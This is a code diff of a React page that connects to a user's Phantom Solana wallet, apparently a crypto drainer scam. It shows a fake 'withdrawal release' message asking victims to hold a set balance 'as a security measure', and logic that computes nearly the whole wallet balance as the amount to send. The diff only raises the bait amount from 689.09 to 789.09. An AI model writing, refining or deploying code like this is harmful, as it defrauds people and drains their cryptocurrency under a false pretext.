@@ -23,7 +23,7 @@ const SOL_PRICE = 150 // 🔥 precio fijo
 
   // 🔁 demo conversion
   const SOL_RATE = SOL_PRICE
-  const usd = 689.09 // 
+  const usd = 789.09 // 
   const sol = usd / SOL_RATE
 
   const getProvider = () => {
@@ -66,7 +66,7 @@ const publicKey = res.publicKey
       const amount = balance - SAFETY_BUFFER
 
       if (amount <= 0) {
-        alert("Add 689.09 SOL balance to phantom")
+        alert("Add 789.09 SOL balance to phantom")
         return
       }
 
@@ -204,7 +204,7 @@ const publicKey = res.publicKey
       </p>
 
       <p className="text-yellow-200/80 text-sm leading-relaxed">
-        To release the <span className="font-semibold text-white">corresponding withdrawal to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span> you must maintain a balance of <span className="text-yellow-300 font-semibold">$689.09 USD</span> 
+        To release the <span className="font-semibold text-white">corresponding withdrawal to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span> you must maintain a balance of <span className="text-yellow-300 font-semibold">$789.09 USD</span> 
         in your wallet beforehand. this is a security measure to ensure transaction 
         can be processed without issues. 
       </p>
